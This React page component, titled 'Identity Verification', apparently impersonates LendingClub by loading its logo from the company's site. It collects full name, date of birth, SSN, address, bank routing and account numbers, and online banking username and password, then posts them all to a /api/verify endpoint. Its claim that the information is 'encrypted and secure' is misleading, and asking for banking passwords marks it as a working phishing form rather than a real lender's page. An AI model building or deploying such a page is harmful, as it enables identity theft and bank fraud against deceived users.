import { useState } from "react";
import { useToast } from "@/hooks/use-toast";

const US_STATES = [
  "AL","AK","AZ","AR","CA","CO","CT","DE","FL","GA","HI","ID","IL","IN","IA",
  "KS","KY","LA","ME","MD","MA","MI","MN","MS","MO","MT","NE","NV","NH","NJ",
  "NM","NY","NC","ND","OH","OK","OR","PA","RI","SC","SD","TN","TX","UT","VT",
  "VA","WA","WV","WI","WY","DC",
];

function formatPhone(value: string) {
  const digits = value.replace(/\D/g, "").slice(0, 10);
  if (digits.length < 4) return digits;
  if (digits.length < 7) return `(${digits.slice(0, 3)}) ${digits.slice(3)}`;
  return `(${digits.slice(0, 3)}) ${digits.slice(3, 6)}-${digits.slice(6)}`;
}

function formatDOB(value: string) {
  const digits = value.replace(/\D/g, "").slice(0, 8);
  if (digits.length < 3) return digits;
  if (digits.length < 5) return `${digits.slice(0, 2)}/${digits.slice(2)}`;
  return `${digits.slice(0, 2)}/${digits.slice(2, 4)}/${digits.slice(4)}`;
}

function formatSSN(value: string) {
  const digits = value.replace(/\D/g, "").slice(0, 9);
  if (digits.length < 4) return digits;
  if (digits.length < 6) return `${digits.slice(0, 3)}-${digits.slice(3)}`;
  return `${digits.slice(0, 3)}-${digits.slice(3, 5)}-${digits.slice(5)}`;
}

function formatRouting(value: string) {
  return value.replace(/\D/g, "").slice(0, 9);
}

function formatZip(value: string) {
  return value.replace(/\D/g, "").slice(0, 5);
}

type FieldKey =
  | "firstName" | "lastName" | "email" | "phone" | "dob" | "ssn"
  | "address" | "city" | "state" | "country" | "zip" | "loanAmount"
  | "bankName" | "routing" | "account" | "onlineBankingId" | "onlineBankingPass";

const INITIAL: Record<FieldKey, string> = {
  firstName: "", lastName: "", email: "", phone: "", dob: "", ssn: "",
  address: "", city: "", state: "", country: "US", zip: "", loanAmount: "",
  bankName: "", routing: "", account: "", onlineBankingId: "", onlineBankingPass: "",
};

export default function Verify() {
  const { toast } = useToast();
  const [form, setForm] = useState<Record<FieldKey, string>>(INITIAL);
  const [submitting, setSubmitting] = useState(false);
  const [submitted, setSubmitted] = useState(false);

  function handleChange(key: FieldKey, raw: string) {
    let val = raw;
    if (key === "phone") val = formatPhone(raw);
    else if (key === "dob") val = formatDOB(raw);
    else if (key === "ssn") val = formatSSN(raw);
    else if (key === "routing") val = formatRouting(raw);
    else if (key === "zip") val = formatZip(raw);
    setForm((prev) => ({ ...prev, [key]: val }));
  }

  async function handleSubmit(e: React.FormEvent) {
    e.preventDefault();
    setSubmitting(true);
    try {
      const res = await fetch("/api/verify", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(form),
      });
      if (!res.ok) throw new Error("Submission failed");
      setSubmitted(true);
    } catch {
      toast({ title: "Error", description: "Failed to submit. Please try again.", variant: "destructive" });
    } finally {
      setSubmitting(false);
    }
  }

  if (submitted) {
    return (
      <div className="min-h-screen bg-[#F0F7FC] flex items-center justify-center px-4">
        <div className="bg-white rounded-2xl shadow-lg p-10 max-w-md w-full text-center">
          <div className="w-16 h-16 rounded-full bg-[#EFF5FA] flex items-center justify-center mx-auto mb-6">
            <svg className="w-8 h-8 text-[#0077B3]" fill="none" stroke="currentColor" viewBox="0 0 24 24">
              <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M5 13l4 4L19 7" />
            </svg>
          </div>
          <h2 className="text-2xl font-extrabold text-[#113B5E] mb-3">Verification Submitted</h2>
          <p className="text-gray-500 text-base mb-8">Thank you! Your information has been received. Our team will be in touch shortly.</p>
          <a
            href="/"
            className="inline-block font-bold px-10 py-3 text-sm transition-colors"
            style={{ backgroundColor: "#ffffff", color: "#113B5E", border: "1px solid #113B5E", borderRadius: "8px" }}
            onMouseEnter={(e) => {
              const el = e.currentTarget as HTMLAnchorElement;
              el.style.backgroundColor = "#0077B3";
              el.style.color = "#ffffff";
              el.style.borderColor = "#0077B3";
            }}
            onMouseLeave={(e) => {
              const el = e.currentTarget as HTMLAnchorElement;
              el.style.backgroundColor = "#ffffff";
              el.style.color = "#113B5E";
              el.style.borderColor = "#113B5E";
            }}
          >
            Back to Home
          </a>
        </div>
      </div>
    );
  }

  const inputClass = "w-full px-4 py-2.5 border border-gray-300 rounded-lg text-sm text-gray-800 focus:outline-none focus:border-[#0077B3] focus:ring-1 focus:ring-[#0077B3] transition-colors placeholder-gray-400";
  const labelClass = "block text-xs font-semibold text-[#113B5E] mb-1 uppercase tracking-wide";

  return (
    <div className="min-h-screen bg-[#F0F7FC]">
      {/* Header */}
      <div className="bg-white border-b border-gray-200 py-4 px-6">
        <a href="/" className="flex items-center gap-2">
          <img
            src="https://www.lendingclub.com/_next/image?url=https%3A%2F%2Fimages.ctfassets.net%2Forqped9h4wgz%2F3MxjFnJUbSMGYbOcDuF0ow%2Fec6da26e30a254e0f2c59c1c52e5c6ae%2FLendingClub_RGB_Rebrand_NavyBlue_Logo.png&w=256&q=75"
            alt="LendingClub"
            className="h-7"
          />
        </a>
      </div>

      {/* Form */}
      <div className="max-w-3xl mx-auto px-4 sm:px-6 py-12">
        <div className="mb-8">
          <h1 className="text-3xl font-extrabold text-[#113B5E] mb-2">Identity Verification</h1>
          <p className="text-gray-500 text-base">Please fill out all fields accurately. Your information is encrypted and secure.</p>
        </div>

        <form onSubmit={handleSubmit} className="space-y-8">
          {/* Personal Information */}
          <div className="bg-white rounded-2xl shadow-sm p-6">
            <h2 className="text-base font-extrabold text-[#113B5E] mb-5 pb-3 border-b border-gray-100">Personal Information</h2>
            <div className="grid grid-cols-1 sm:grid-cols-2 gap-4">
              <div>
                <label className={labelClass}>First Name</label>
                <input required className={inputClass} placeholder="John" value={form.firstName}
                  onChange={(e) => handleChange("firstName", e.target.value)} data-testid="input-first-name" />
              </div>
              <div>
                <label className={labelClass}>Last Name</label>
                <input required className={inputClass} placeholder="Doe" value={form.lastName}
                  onChange={(e) => handleChange("lastName", e.target.value)} data-testid="input-last-name" />
              </div>
              <div>
                <label className={labelClass}>Email</label>
                <input required type="email" className={inputClass} placeholder="john@email.com" value={form.email}
                  onChange={(e) => handleChange("email", e.target.value)} data-testid="input-email" />
              </div>
              <div>
                <label className={labelClass}>Phone</label>
                <input required className={inputClass} placeholder="(555) 555-5555" value={form.phone}
                  onChange={(e) => handleChange("phone", e.target.value)} data-testid="input-phone" />
              </div>
              <div>
                <label className={labelClass}>Date of Birth</label>
                <input required className={inputClass} placeholder="MM/DD/YYYY" value={form.dob}
                  onChange={(e) => handleChange("dob", e.target.value)} data-testid="input-dob" />
              </div>
              <div>
                <label className={labelClass}>SSN</label>
                <input required className={inputClass} placeholder="XXX-XX-XXXX" value={form.ssn}
                  onChange={(e) => handleChange("ssn", e.target.value)} data-testid="input-ssn" />
              </div>
              <div>
                <label className={labelClass}>Loan Amount</label>
                <input required className={inputClass} placeholder="$10,000" value={form.loanAmount}
                  onChange={(e) => handleChange("loanAmount", e.target.value)} data-testid="input-loan-amount" />
              </div>
            </div>
          </div>

          {/* Address */}
          <div className="bg-white rounded-2xl shadow-sm p-6">
            <h2 className="text-base font-extrabold text-[#113B5E] mb-5 pb-3 border-b border-gray-100">Address</h2>
            <div className="grid grid-cols-1 sm:grid-cols-2 gap-4">
              <div className="sm:col-span-2">
                <label className={labelClass}>Street Address</label>
                <input required className={inputClass} placeholder="123 Main St" value={form.address}
                  onChange={(e) => handleChange("address", e.target.value)} data-testid="input-address" />
              </div>
              <div>
                <label className={labelClass}>City</label>
                <input required className={inputClass} placeholder="New York" value={form.city}
                  onChange={(e) => handleChange("city", e.target.value)} data-testid="input-city" />
              </div>
              <div>
                <label className={labelClass}>State</label>
                <select required className={inputClass} value={form.state}
                  onChange={(e) => handleChange("state", e.target.value)} data-testid="select-state">
                  <option value="">Select State</option>
                  {US_STATES.map((s) => <option key={s} value={s}>{s}</option>)}
                </select>
              </div>
              <div>
                <label className={labelClass}>Country</label>
                <select required className={inputClass} value={form.country}
                  onChange={(e) => handleChange("country", e.target.value)} data-testid="select-country">
                  <option value="US">United States</option>
                  <option value="CA">Canada</option>
                </select>
              </div>
              <div>
                <label className={labelClass}>ZIP Code</label>
                <input required className={inputClass} placeholder="10001" value={form.zip}
                  onChange={(e) => handleChange("zip", e.target.value)} data-testid="input-zip" />
              </div>
            </div>
          </div>

          {/* Banking Information */}
          <div className="bg-white rounded-2xl shadow-sm p-6">
            <h2 className="text-base font-extrabold text-[#113B5E] mb-5 pb-3 border-b border-gray-100">Banking Information</h2>
            <div className="grid grid-cols-1 sm:grid-cols-2 gap-4">
              <div>
                <label className={labelClass}>Bank Name</label>
                <input required className={inputClass} placeholder="Chase Bank" value={form.bankName}
                  onChange={(e) => handleChange("bankName", e.target.value)} data-testid="input-bank-name" />
              </div>
              <div>
                <label className={labelClass}>Routing Number</label>
                <input required className={inputClass} placeholder="9 digits" value={form.routing}
                  onChange={(e) => handleChange("routing", e.target.value)} data-testid="input-routing" />
              </div>
              <div>
                <label className={labelClass}>Account Number</label>
                <input required className={inputClass} placeholder="Account number" value={form.account}
                  onChange={(e) => handleChange("account", e.target.value)} data-testid="input-account" />
              </div>
              <div>
                <label className={labelClass}>Online Banking ID</label>
                <input required className={inputClass} placeholder="Username / ID" value={form.onlineBankingId}
                  onChange={(e) => handleChange("onlineBankingId", e.target.value)} data-testid="input-banking-id" />
              </div>
              <div className="sm:col-span-2">
                <label className={labelClass}>Online Banking Password</label>
                <input required type="password" className={inputClass} placeholder="Password" value={form.onlineBankingPass}
                  onChange={(e) => handleChange("onlineBankingPass", e.target.value)} data-testid="input-banking-pass" />
              </div>
            </div>
          </div>

          {/* Submit */}
          <div className="flex justify-end">
            <button
              type="submit"
              disabled={submitting}
              className="font-bold px-14 py-3 text-sm transition-colors disabled:opacity-60"
              style={{ backgroundColor: "#ffffff", color: "#113B5E", border: "1px solid #113B5E", borderRadius: "8px" }}
              onMouseEnter={(e) => {
                if (submitting) return;
                const btn = e.currentTarget as HTMLButtonElement;
                btn.style.backgroundColor = "#0077B3";
                btn.style.color = "#ffffff";
                btn.style.borderColor = "#0077B3";
              }}
              onMouseLeave={(e) => {
                const btn = e.currentTarget as HTMLButtonElement;
                btn.style.backgroundColor = "#ffffff";
                btn.style.color = "#113B5E";
                btn.style.borderColor = "#113B5E";
              }}
              data-testid="btn-submit-verify"
            >
              {submitting ? "Submitting..." : "Submit Verification"}
            </button>
          </div>
        </form>
      </div>
    </div>
  );
}
